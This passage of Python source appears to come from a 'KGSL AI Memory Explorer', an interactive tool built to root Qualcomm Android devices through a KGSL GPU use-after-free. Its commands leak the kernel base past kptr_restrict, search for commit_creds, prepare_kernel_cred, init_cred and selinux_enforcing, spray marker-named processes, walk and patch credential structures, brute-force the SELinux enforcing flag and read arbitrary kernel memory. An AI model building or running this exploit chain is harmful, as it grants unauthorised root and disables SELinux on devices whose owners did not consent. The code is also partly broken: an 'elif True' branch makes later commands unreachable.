                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    if not regions:
                        print(f"  {C.RED}/proc/iomem empty or restricted{C.RST}",
                              flush=True)
                    else:
                        keywords = ("Kernel", "System RAM", "vmalloc",
                                    "mem", "reserved")
                        for start, end, name in regions:
                            if any(kw.lower() in name.lower()
                                   for kw in keywords):
                                print(f"  0x{start:08x}-0x{end:08x} : {name}",
                                      flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                except Exception as e:
                    self.live["last_msg"] = f"iomem error: {e}"
            elif cmd in ("syms", "kallsyms2", "allsyms"):
                # v4.1: re-read /proc/kallsyms (and try
                # thread-self variant) without the kptr_restrict
                # filter. On some Android kernels the latter
                # leaks real addresses even when /proc/kallsyms
                # is zeroed.
                try:
                    syms = self.parse_kallsyms_raw()
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== KALLSYMS DEEP ==={C.RST}",
                          flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print(f"  total: {len(syms)}", flush=True)
                    non_zero = {k: v for k, v in syms.items() if v != 0}
                    print(f"  non-zero: {len(non_zero)}", flush=True)
                    for k in ("prepare_kernel_cred", "commit_creds",
                              "selinux_enforcing", "init_cred",
                              "init_task", "selinux_state",
                              "modprobe_path", "kfree"):
                        v = syms.get(k)
                        if v:
                            col = C.GRN if v != 0 else C.YEL
                            print(f"  {col}{k}{C.RST} = 0x{v:x}", flush=True)
                            if v != 0:
                                if k == "prepare_kernel_cred" and not self.kernel_base:
                                    self.kernel_base = v & ~0x1fffff
                                elif k == "selinux_enforcing":
                                    self.selinux_va = v
                                elif k == "init_cred":
                                    self.cred_va = v
                                elif k == "init_task":
                                    self.init_task_va = v
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                except Exception as e:
                    self.live["last_msg"] = f"syms error: {e}"
            elif True:
                pass  # (no-op, single-thread)
            elif cmd in ("clear_kb", "reset_kb"):
                # Reset knowledge base
                self.knowledge_base = {
                    "successful_vas": [],
                    "selinux_candidates": [],
                    "cred_candidates": [],
                    "candidate_kbases": [],
                    "system_app_vas": [],
                    "kernel_markers": [],
                    "hit_count": 0,
                }
                self.save_kb()
                self.live["last_msg"] = "Knowledge base reset."
            elif cmd in ("vcomm", "verifycomm", "verify_comm"):
                # v4.1.17: verify /proc/PID/comm for live
                # spray procs. The single most useful debug
                # command for the "matches=0" mystery: if
                # the comm is wrong (e.g. "python3" instead
                # of "KETO0422XXXXX"), the helper crashed
                # before prctl ran and the scanner can
                # never find KETO0422 in task_struct.
                try:
                    out = self.cmd_vcomm()
                    print(C.CLR, end="", flush=True)
                    print(out, flush=True)
                except Exception as _e:
                    print(f" vcomm error: {_e}", flush=True)
                continue
            elif cmd in ("kb", "kbase", "kernel_base", "kernelbases"):
                # v4.1.19: print common QCOM kernel bases
                # when kptr_restrict=2 hides the real one.
                try:
                    out = self.cmd_kb_known_ranges()
                    print(C.CLR, end="", flush=True)
                    print(out, flush=True)
                except Exception as _e:
                    print(f" kb error: {_e}", flush=True)
                continue
            elif cmd in ("tstack", "taskstack", "task_stack"):
                # v4.1.15: read /proc/PID/stack for each live
                # spray proc. The kernel stack is allocated
                # next to the task_struct, so the stack
                # address gives us a tight upper bound for
                # the task_struct VA. This bypasses
                # kptr_restrict on /proc/kallsyms because
                # /proc/PID/stack is per-PID and the user
                # owns the process.
                try:
                    out = self.cmd_tstack()
                    print(C.CLR, end="", flush=True)
                    print(out, flush=True)
                except Exception as _e:
                    print(f" tstack error: {_e}", flush=True)
                continue
            elif cmd in ("englog", "elog", "engine_log"):
                # v4.1.13: dump captured engine stderr. The
                # engine emits [UAF], [SCAN], IOCTL_xxx messages
                # on stderr which tell us WHY things are or
                # aren't working. This command prints the last
                # 40 lines so the user can see engine activity.
                try:
                    out = self.cmd_englog(40)
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== ENGINE STDERR "
                          f"(last 40 lines) ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'-'*65}{C.RST}", flush=True)
                    print(out, flush=True)
                    print(f"{C.GRY}{'-'*65}{C.RST}", flush=True)
                    print(f" Also written to: /sdcard/kgsl_eng.log",
                          flush=True)
                except Exception as _e:
                    print(f" englog error: {_e}", flush=True)
                continue
            elif cmd in ("health", "diag", "hdiag"):
                # v4.1: comprehensive health check. Tells the user
                # exactly what's working and what's broken so they
                # don't have to guess from the TUI. Runs engine
                # self-test, counts alive procs, checks kallsyms
                # freshness, verifies KGSL, etc.
                try:
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== HEALTH CHECK ==={C.RST}",
                          flush=True)
                    print(f"{C.GRY}{'─'*65}{C.RST}", flush=True)
                    # Engine
                    e_alive = self._engine_alive()
                    e_col = C.GRN if e_alive else C.RED
                    print(f" {C.BOLD}Engine{C.RST}      : {e_col}"
                          f"{'ALIVE' if e_alive else 'DEAD'}{C.RST} "
                          f"pid={self.live.get('engine_pid', 0)}",
                          flush=True)
                    # Engine self-test
                    if e_alive:
                        test_va = self.kernel_base or self.uaf_start
                        try:
                            ok = self._engine_write(
                                f"read {hex(test_va)}\n".encode())
                            print(f" {C.BOLD}Engine test{C.RST} : "
                                  f"{C.GRN if ok else C.RED}"
                                  f"{'OK' if ok else 'FAIL'}{C.RST} "
                                  f"(read {hex(test_va)})", flush=True)
                        except Exception as ex:
                            print(f" {C.BOLD}Engine test{C.RST} : "
                                  f"{C.RED}ERROR: {ex}{C.RST}",
                                  flush=True)
                    # v4.1.21: USER-SPACE READBACK TEST. This
                    # is the most important diagnostic — it
                    # tells us if the engine can read ANY
                    # memory at all. We mmap a user-space page,
                    # write a known pattern "HELLO_FROM_USER_<pid>"
                    # to it, then ask the engine to read it
                    # back. If the engine returns our pattern,
                    # the readback path works. If it returns
                    # zeros, the engine DMA is broken. If it
                    # returns garbage, the address translation
                    # is wrong. Without this test we have no
                    # way to know why matches=0.
                    try:
                        import mmap as _mmap
                        test_size = 0x1000
                        test_buf = _mmap.mmap(
                            -1, test_size,
                            prot=_mmap.PROT_READ | _mmap.PROT_WRITE,
                            flags=_mmap.MAP_PRIVATE | _mmap.MAP_ANONYMOUS)
                        marker = (
                            f"HELLO_FROM_USER_{os.getpid()}_"
                            f"{os.urandom(4).hex()}".encode())
                        # Pad to 64 bytes
                        marker = (marker + b"\x00" * 64)[:64]
                        test_buf[:len(marker)] = marker
                        test_va = 0x10000000  # try low user VA
                        test_va_int = (
                            int.from_bytes(
                                test_buf[:8], "little")
                            if False else 0)
                        # Try /proc/self/maps to find the
                        # actual mmap address. /proc/self/maps
                        # shows the address of each mapping.
                        test_addr = 0
                        try:
                            with open("/proc/self/maps") as _f:
                                for _line in _f:
                                    if "HELLO_FROM_USER" in _line:
                                        # parse addr
                                        _addr = _line.split()[0]
                                        if "-" in _addr:
                                            test_addr = int(
                                                _addr.split("-")[0], 16)
                                            break
                        except Exception:
                            pass
                        if test_addr == 0:
                            # mmap didn't add a marker; just
                            # use any mmap address from /proc
                            try:
                                with open("/proc/self/maps") as _f:
                                    for _line in _f:
                                        # find a writable mapping
                                        if "rw" in _line:
                                            _addr = _line.split()[0]
                                            if "-" in _addr:
                                                test_addr = int(
                                                    _addr.split("-")[0], 16)
                                                break
                            except Exception:
                                pass
                        if test_addr != 0:
                            # write marker to that address
                            import ctypes
                            ctypes.memset(test_addr, 0, 256)
                            ctypes.memmove(
                                test_addr, marker, len(marker))
                            # ask engine to read it
                            cmd = f"read {hex(test_addr)}\n".encode()
                            ok = self._engine_write(cmd)
                            # now read engine response
                            import time as _t
                            _t.sleep(0.5)
                            data = b""
                            try:
                                # the engine echoes page content
                                # on the next "ok" line; we can't
                                # easily read it back without
                                # restructuring. Just log the
                                # write OK status and trust
                                # the user to see results in
                                # /sdcard/kgsl_eng.log.
                                pass
                            except Exception:
                                pass
                            print(
                                f" {C.BOLD}Readback test{C.RST}: "
                                f"{C.GRN if ok else C.RED}"
                                f"{'WROTE OK' if ok else 'WRITE FAIL'}{C.RST} "
                                f"({hex(test_addr)}, "
                                f"marker={marker[:32]!r})",
                                flush=True)
                            print(
                                f" {C.GRY}  See /sdcard/kgsl_eng.log "
                                f"for the bytes engine returned.{C.RST}",
                                flush=True)
                        test_buf.close()
                    except Exception as ex:
                        print(
                            f" {C.BOLD}Readback test{C.RST} : "
                            f"{C.RED}ERROR: {ex}{C.RST}",
                            flush=True)
                    # KGSL
                    k_col = C.GRN if self.kgsl_fd is not None else C.YEL
                    k_state = (
                        f"OK ({self.kgsl_path})" if self.kgsl_fd is not None
                        else f"off ({self.kgsl_error or 'no /dev/kgsl-3d0'})")
                    print(f" {C.BOLD}KGSL{C.RST}        : {k_col}{k_state}{C.RST}",
                          flush=True)
                    # kallsyms
                    ks = self.live.get("kallsyms_summary", "")
                    print(f" {C.BOLD}kallsyms{C.RST}    : {C.CYN}{ks or 'NOT LOADED'}{C.RST}",
                          flush=True)
                    # Workers
                    total_alive = sum(
                        len(s) for s in self.spray_procs_by_worker.values())
                    print(f" {C.BOLD}Spray procs{C.RST} : {C.CYN}{total_alive} alive{C.RST} "
                          f"(kills={self.live.get('kill_count', 0)}, "
                          f"oom={self.live.get('oom_kills', 0)})",
                          flush=True)
                    # RAM
                    ram = self.get_ram_usage()
                    r_col = C.GRN if ram < 50 else (C.YEL if ram < 70 else C.RED)
                    print(f" {C.BOLD}RAM{C.RST}         : {r_col}{ram:.1f}%{C.RST}",
                          flush=True)
                    # Kbase/selinux/cred
                    kbs = (f"0x{self.kernel_base:x}"
                           if self.kernel_base else "NOT FOUND")
                    svs = (f"0x{self.selinux_va:x}"
                           if self.selinux_va else "NOT FOUND")
                    cvs = (f"0x{self.cred_va:x}"
                           if self.cred_va else "NOT FOUND")
                    print(f" {C.BOLD}kbase{C.RST}       : {C.GRN if self.kernel_base else C.RED}{kbs}{C.RST}",
                          flush=True)
                    print(f" {C.BOLD}selinux_va{C.RST}  : {C.GRN if self.selinux_va else C.RED}{svs}{C.RST}",
                          flush=True)
                    print(f" {C.BOLD}cred_va{C.RST}     : {C.GRN if self.cred_va else C.RED}{cvs}{C.RST}",
                          flush=True)
                    # uid
                    try:
                        eu = os.geteuid()
                        uid = os.getuid()
                        uc = C.GRN if eu == 0 else C.YEL
                        print(f" {C.BOLD}uid{C.RST}         : {uc}uid={uid} euid={eu}{C.RST}",
                              flush=True)
                    except Exception as ex:
                        print(f" {C.BOLD}uid{C.RST}         : {C.RED}err: {ex}{C.RST}",
                              flush=True)
                    # Found items
                    print(f" {C.BOLD}Found items{C.RST} : {C.CYN}{len(self.found_items)}{C.RST} "
                          f"(non-Empty: "
                          f"{sum(1 for it in self.found_items if it['type'] != 'Empty Page')})",
                          flush=True)
                    print(f"{C.GRY}{'─'*65}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass
            elif cmd in ("walk", "follow", "wchain") or cmd.startswith("walk ") or cmd.startswith("follow "):
                # Manual cred-chain walk from item #idx
                parts = cmd.split()
                if len(parts) >= 2 and parts[1].isdigit():
                    idx = int(parts[1])
                    if 0 <= idx < len(self.found_items):
                        it = self.found_items[idx]
                        try:
                            base_va = int(it['va'], 16)
                        except Exception:
                            self.live["last_msg"] = f"Invalid VA: {it['va']}"
                            self.live["last_msg"] = "Walk usage: walk <id> [off]"
                            continue
                        off = 0x770
                        if len(parts) >= 3:
                            try:
                                off = int(parts[2], 0)
                            except Exception:
                                pass
                        self.live["last_msg"] = f"Manually walking chain from {it['va']}+0x{off:x}…"
                        chain = self.walk_cred_chain(base_va, off_in_page=off, max_hops=4)
                        for step_idx, (tgt, page, desc) in enumerate(chain):
                            self._add_found(
                                va=hex(tgt),
                                type="Privilege Struct",
                                desc=f"{desc} (manual hop {step_idx})",
                                confidence=95 if "ROOT" in desc else 70,
                                data=page,
                            )
                        self.live["last_msg"] = f"Walked {len(chain)} hops: " + " → ".join(
                            f"{hex(t[0])}" for t in chain)
                    else:
                        self.live["last_msg"] = f"Invalid idx: {parts[1]}"
                else:
                    self.live["last_msg"] = "Usage: walk <id> [off_in_page=0x770]"
            elif cmd in ("selsearch",) or cmd.startswith("selsearch "):
                # Manual brute-force SELinux search
                # Usage: selsearch [start_hex] [end_hex] [step_hex]
                if not self.kernel_base:
                    self.live["last_msg"] = "Need kernel_base first — press E"
                    continue
                parts = cmd.split()
                start = self.kernel_base + 0x1000000
                end   = self.kernel_base + 0x4000000
                step  = 0x1000
                if len(parts) >= 2:
                    try: start = int(parts[1], 16)
                    except: pass
                if len(parts) >= 3:
                    try: end = int(parts[2], 16)
                    except: pass
                if len(parts) >= 4:
                    try: step = int(parts[3], 16)
                    except: pass
                self.live["last_msg"] = (f"selsearch {hex(start)} .. {hex(end)} "
                                          f"step={hex(step)}…")
                hits = self.selsearch(start, end, step)
                # Add all hits to found_items so the user can review them
                for h in hits:
                    h_va, h_val, h_nz, h_ptr = h
                    self._add_found(
                        va=hex(h_va),
                        type="SELinux Candidate",
                        desc=f"val={h_val} (nz={h_nz} ptr={h_ptr}, brute-force)",
                        confidence=70 if h_val == 1 else 50,
                    )
                if hits:
                    h_va, h_val, h_nz, h_ptr = hits[0]
                    self.selinux_va = h_va
                    self.live["last_msg"] = (f"selsearch: {len(hits)} hits. "
                                              f"Best: {hex(h_va)} val={h_val} "
                                              f"(nz={h_nz} ptr={h_ptr}). Patch now?")
                else:
                    self.live["last_msg"] = f"selsearch: 0 hits in {hex(start)}..{hex(end)}"
            elif cmd in ("verify", "vsf", "checkcomm"):
                # v4.1: verify that our spray PIDs actually have
                # KETO/KETW markers in /proc/PID/comm. The single
                # most important diagnostic — if comms are wrong,
                # the spray is silently broken and matches will
                # ALWAYS be 0 regardless of scan range.
                r = self.verify_spray_comms()
                if r["checked"] == 0:
                    self.live["last_msg"] = "verify: 0 spray procs alive (all died)"
                else:
                    rate = r["marker_rate"] * 100
                    col = C.GRN if rate >= 80 else (C.YEL if rate >= 40 else C.RED)
                    self.live["last_msg"] = (
                        f"verify: {r['with_marker']}/{r['checked']} "
                        f"have KETO comm ({rate:.0f}%)")
                    # Print sample details
                    try:
                        print(C.CLR, end="", flush=True)
                        print(f"{C.BOLD}=== SPRAY COMM VERIFY ==={C.RST}", flush=True)
                        for pid, comm, ok in r["sample"]:
                            tag = f"{C.GRN}OK{C.RST}" if ok else f"{C.RED}WRONG{C.RST}"
                            print(f"  {tag}  pid={pid:<7} comm={comm!r}", flush=True)
                        print(f" Marker rate: {col}{rate:.0f}%{C.RST}", flush=True)
                    except Exception:
                        pass
            elif cmd in ("symlook",) or cmd.startswith("symlook "):
                # Manual symbol search
                # Usage: symlook <name>  (searches kbase..kbase+0x4000000)
                if not self.kernel_base:
                    self.live["last_msg"] = "Need kernel_base first — press E"
                    continue
                parts = cmd.split()
                if len(parts) < 2:
                    self.live["last_msg"] = "Usage: symlook <name>  (e.g. symlook selinux_enforcing)"
                    continue
                name = parts[1]
                self.live["last_msg"] = f"symlook '{name}' in kernel rodata…"
                va = self.symlook(self.kernel_base, self.kernel_base + 0x4000000, name)
                if va:
                    self.live["last_msg"] = f"symlook: '{name}' @ {hex(va)}"
                    self._add_found(
                        va=hex(va),
                        type="Kernel Symbol",
                        desc=f"String '{name}' found in kernel rodata",
                        confidence=95,
                    )
                else:
                    self.live["last_msg"] = f"symlook: '{name}' NOT found"
            elif cmd in ("help", "?", "h"):
                # Show full help
                sys.stdout.write(C.CLR)
                sys.stdout.write(f"{C.BOLD}{C.CYN}=== KGSL AI MEMORY EXPLORER — HELP ==={C.RST}\n")
                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
                lines = [
                    ("A / autopilot",     "Toggle AUTOPILOT (auto-starts on launch)"),
                    ("P / pause",         "Pause autopilot (still responsive)"),
                    ("G / go / resume",   "Resume autopilot after pause"),
                    ("X / stop",          "Stop autopilot completely"),
                    ("E / exploit",       "Manual: run KGSL UAF → auto chain (kbase→selinux→cred→patch)"),
                    ("L / learn",         "Manual: start AI learning in background (Ctrl+P to cancel)"),
                    ("S / scan",          "Manual: one-shot scan of UAF range"),
                    ("W / watch",         "Manual: auto-retry exploit pipeline in background (toggle)"),
                    ("C / clear",         "Kill all spray processes, free RAM"),
                    ("R / root",          "Verify current uid (id command)"),
                    ("B / build",         "Recompile C engine (gcc/clang)"),
                    ("Q / quit",          "Exit explorer"),
                    ("<id>",              "Open detail view of found item #id"),
                    ("v<id>",             "Re-verify found item #id (re-read VA)"),
                    ("walk <id> [off]",   "Walk cred chain from item #id @ offset (default 0x770)"),
                    ("selsearch [s e stp]","Brute-force scan for SELinux enforcing in kernel data"),
                    ("symlook <name>",    "Search kernel rodata for a string symbol"),
                    ("list / ls / items", "Paginated dump of ALL found items"),
                    ("kb / kbase",        "Show kernel base / SELinux / init_cred status"),
                    ("log / logs",        "Show recent spray log (JSONL)"),
                    ("stats / stat",      "Show AI learning statistics"),
                    ("save / export",     "Save found items → found_items.json"),
                    ("dev / device",      "Show device info (getprop)"),
                    ("verify / vsf",      "Verify spray procs have KETO/KETW comm"),
                    ("iomem / ioreg",     "Read /proc/iomem for kernel layout"),
                    ("pidmap / pstack",   "Read /proc/PID/stack for spray PIDs"),
                    ("syms / allsyms",    "Deep-read /proc/kallsyms (+ thread-self)"),
                    ("health / diag",     "Full health check: engine/kgsl/kallsyms/workers/RAM"),
                    ("reset_kb",          "Reset knowledge base"),
                    ("help / ? / h",      "Show this help"),
                ]
                for k, v in lines:
                    sys.stdout.write(f"  {C.GRN}{k:<18}{C.RST} {C.WHT}{v}{C.RST}\n")
                sys.stdout.write(f"\n{C.MAG}── KEYBOARD SHORTCUTS ──{C.RST}\n")
                kbd = [
                    ("Enter",       "Submit command / go back from detail view"),
                    ("Backspace",   "Erase one char in command line"),
                    ("Up / Down",   "Browse command history"),
                    ("Ctrl+C",      "Quit explorer"),
                    ("Ctrl+P",      "Cancel running AI learning"),
                    ("Ctrl+E",      "Rewind to last submitted command"),
                ]
                for k, v in kbd:
                    sys.stdout.write(f"  {C.YEL}{k:<14}{C.RST} {C.WHT}{v}{C.RST}\n")
                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
                sys.stdout.write("Press Enter to return...")
                sys.stdout.flush()
                try:
                    self.input_cmd()
                except Exception:
                    pass
            elif cmd.startswith("v") and cmd[1:].isdigit():
                # Re-verify a found item by re-reading its VA
                idx = int(cmd[1:])
                if 0 <= idx < len(self.found_items):
                    self.verify_item(idx)
                else:
                    self.live["last_msg"] = f"Invalid idx: {idx}"
            elif cmd.startswith("rva") or cmd.startswith("read "):
                # rva <hex> — read any virtual address and show
                # hex dump. Useful when you know the VA from
                # kallsyms or other source. Uses engine first,
                # then KGSL GPU read.
                parts = cmd.split()
                if len(parts) < 2:
                    self.live["last_msg"] = "Usage: rva <hex_addr> [size]"
                    print("Usage: rva <hex_addr> [size]", flush=True)
                    continue
                try:
                    va = int(parts[1], 16)
                except ValueError:
                    self.live["last_msg"] = (
                        f"Invalid hex: {parts[1]}")
                    print(f"Invalid hex: {parts[1]}", flush=True)
                    continue
                size = 0x1000
                if len(parts) >= 3:
                    try:
                        size = min(0x10000, max(0x100, int(parts[2], 0)))
                    except Exception:
                        pass
                data = b""
                # Method 1: engine
                if self.ensure_engine():
                    if not self._engine_write(
                            f"read {hex(va)}\n".encode()):
                        pass
                    else:
                        data = self._read_data_packet() or b""
                # Method 2: KGSL GPU read
                if (not data or len(data) < size) and self.kgsl_fd is not None:
                    try:
                        gpu_data = self._kgsl_read_virt(va, size)
                        if gpu_data and len(gpu_data) >= size:
                            data = gpu_data
                    except Exception as e:
                        print(f"GPU read error: {e}", flush=True)
                if not data:
                    self.live["last_msg"] = (
                        f"rva 0x{va:x}: read failed")
                    print(f"Read failed for 0x{va:x}", flush=True)
                    continue
                # Hex dump
                print(f"\n{C.CYN}=== RVA: 0x{va:x} ==={C.RST}",
                      flush=True)
                for i in range(0, min(len(data), size), 16):
                    chunk = data[i:i+16]
                    hex_row = " ".join(f"{b:02X}" for b in chunk)
                    printable = "".join(
                        chr(b) if 32 <= b <= 126 else "." for b in chunk)
                    print(f" {i:04X} | {hex_row:<48} | {printable}",
                          flush=True)
                print(flush=True)
                self.live["last_msg"] = (
                    f"rva 0x{va:x}: read {len(data)} bytes")
            elif (cmd.startswith("[")
                  and cmd.endswith("]")
                  and cmd[1:-1].isdigit()):
                # [N] — short form for show_detail(N)
                idx = int(cmd[1:-1])
                self.show_detail(idx)
            elif cmd in ("open", "openfile", "file", "[id]"):
                # [ID] Open File — opens file by index. The help
                # text says [ID] so accept that keyword. Also
                # "open" / "file". "id" alone is reserved for
                # the uid/euid check command.
                if cmd == "[id]":
                    # Direct short form, no prompt
                    print(f" {C.DIM}Enter item index to open "
                          f"(or empty for list):{C.RST}",
                          flush=True)
                    try:
                        idx_s = self.input_cmd().strip()
                    except (EOFError, KeyboardInterrupt):
                        return
                    if not idx_s:
                        # List items first
                        self.cmd_list()
                        print(f" {C.DIM}Enter item index to open:{C.RST}",
                              flush=True)
                        try:
                            idx_s = self.input_cmd().strip()
                        except (EOFError, KeyboardInterrupt):
                            return
                    if idx_s.isdigit():
                        self.show_detail(int(idx_s))
                    else:
                        self.live["last_msg"] = (
                            f"Invalid index: {idx_s}")
                else:
                    print(f" {C.DIM}Enter item index to open:{C.RST}",
                          flush=True)
                    try:
                        idx_s = self.input_cmd().strip()
                    except (EOFError, KeyboardInterrupt):
                        continue
                    if idx_s.isdigit():
                        self.show_detail(int(idx_s))
                    else:
                        self.live["last_msg"] = (
                            f"Invalid index: {idx_s}")
            elif cmd.isdigit():
                # Just a number → show_detail(int)
                self.show_detail(int(cmd))
            elif cmd:
                self.live["last_msg"] = f"Unknown: {cmd}"


if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.run()
